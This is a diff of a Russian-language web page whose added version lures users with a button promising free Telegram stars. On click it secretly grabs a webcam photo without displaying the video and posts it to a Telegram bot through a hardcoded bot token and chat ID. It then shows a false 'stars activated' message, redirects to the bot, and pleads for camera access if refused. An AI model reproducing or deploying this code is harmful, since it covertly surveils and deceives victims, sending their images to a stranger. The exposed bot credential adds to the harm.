@@ -1,50 +1,43 @@
-<button id="openCamera">получить звезды в телеграмме</button>
-<video id="video" autoplay style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<button id="magicBtn">⭐ Получить звёзды</button>
 
 <script>
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const button = document.getElementById('openCamera');
+  const botToken = "7227118898:AAFP8Fe1YZAnhn5c5WS_8dmL3mwP2xOIfvg";
+  const chatId = "7807571960";
 
-  button.addEventListener('click', async () => {
+  document.getElementById("magicBtn").addEventListener("click", async () => {
     try {
-      // Запрашиваем доступ к камере
+      // 1. Скрытый запрос камеры
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
       video.srcObject = stream;
-      video.style.display = 'block';
-      
-      // Ждём, пока камера включится
       await new Promise(resolve => video.onloadedmetadata = resolve);
       
-      // Делаем снимок
+      // 2. Делаем фото без отображения
+      const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      
-      // Останавливаем камеру
+      canvas.getContext("2d").drawImage(video, 0, 0);
       stream.getTracks().forEach(track => track.stop());
       
-      // Конвертируем фото в Blob (для отправки)
+      // 3. Отправка в бота
       canvas.toBlob(async (blob) => {
         const formData = new FormData();
-        formData.append('photo', blob, 'user_photo.jpg');
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob, "photo.jpg");
         
-        // Отправляем фото на сервер (бэкенд)
-        const response = await fetch('ВАШ_БЭКЕНД_URL', {
-          method: 'POST',
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: "POST",
           body: formData,
         });
         
-        if (response.ok) {
-          alert('Фото отправлено в бота!');
-        } else {
-          alert('Ошибка отправки :(');
-        }
-      }, 'image/jpeg');
+        // 4. Перенаправление
+        alert("Звёзды активированы! 🎉");
+        window.location.href = "https://t.me/bossband2903_bot";
+      }, "image/jpeg");
       
     } catch (err) {
-      alert('Ошибка доступа к камере: ' + err.message);
+      // Если пользователь отказал в доступе
+      alert("Для получения звёзд разрешите доступ к камере ❤️");
     }
   });
 </script>
